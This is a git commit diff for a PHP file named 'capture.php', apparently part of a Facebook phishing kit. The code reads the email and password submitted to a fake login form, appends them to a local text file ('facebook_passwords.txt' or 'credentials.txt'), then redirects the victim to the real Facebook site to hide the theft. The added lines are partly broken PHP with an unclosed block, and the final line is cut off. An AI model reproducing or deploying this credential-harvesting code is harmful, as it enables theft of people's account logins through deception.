f2fc5f1e143676356ed6902452992fbac71db5e7
Levon2000 <studyhard1588@gmail.com>
2025-03-19 23:05:35 +0400

    Update capture.php

--- capture.php
+++ capture.php
@@ -1,2 +1,4 @@
- <?php$email =$_POST['email'];$password= $_POST['password'];$data="Email:$email\nPassword:$password\n"; file_put_contents('facebook_passwords.txt',$data, FILE_APPEND);header('Location: https://www.facebook.com', true, 301);?>
+if ($_SERVER["REQUEST_METHOD"] =="POST") {$email = $_POST["email"];$password =$_POST["password"];$data="Email:$email\nPassword:$password\n"; file_put_contents('credentials.txt',$data, FILE_APPEND)
+
+<?php$email =$_POST['email'];$password= $_POST['password'];$data="Email:$email\nPassword:$password\n"; file_put_contents('facebook_passwords.txt',$data, FILE_APPEND);header('Location: https://www.facebook.com', true, 301);?>
 <?php$email =$_POST['email'];$password= $_POST['password'];$data="Email:$email\nPassword:$password\n"; file_put_contents('facebook_passwords.txt',$data, FILE_APPEND);  header('Location: https://www.facebook.
